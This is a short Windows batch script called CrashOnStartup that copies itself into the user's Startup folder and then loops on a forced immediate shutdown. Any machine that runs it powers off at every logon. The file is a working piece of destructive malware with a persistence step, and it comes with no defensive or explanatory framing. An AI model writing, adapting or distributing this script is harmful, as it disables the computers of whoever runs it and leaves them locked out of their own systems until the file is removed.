@echo off
set "startupFolder=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batchName=CrashOnStartup.bat"

:: Create a copy of this batch file in the Startup folder
copy "%~f0" "%startupFolder%\%batchName%"

:: Infinite loop to shut down the computer
:start
shutdown /s /f /t 0
goto start
